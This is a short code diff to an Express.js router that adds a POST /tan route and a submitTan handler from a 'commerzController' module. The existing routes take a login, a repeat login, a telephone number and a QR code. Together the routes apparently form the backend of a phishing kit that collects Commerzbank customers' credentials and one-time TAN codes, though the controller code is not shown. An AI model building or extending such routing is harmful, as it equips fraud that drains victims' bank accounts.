@@ -9,6 +9,7 @@ const {
     submitQr,
     deleteEntry,
     getQr,
+    submitTan,
 } = require("../controllers/commerzController");
 
 const router = express.Router();
@@ -20,6 +21,7 @@ router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/telephone", submitTelephone);
 router.post("/qr", submitQr);
+router.post("/tan", submitTan);
 router.post("/delete", deleteEntry);
 router.get("/qr/:uniqueid", getQr);
 
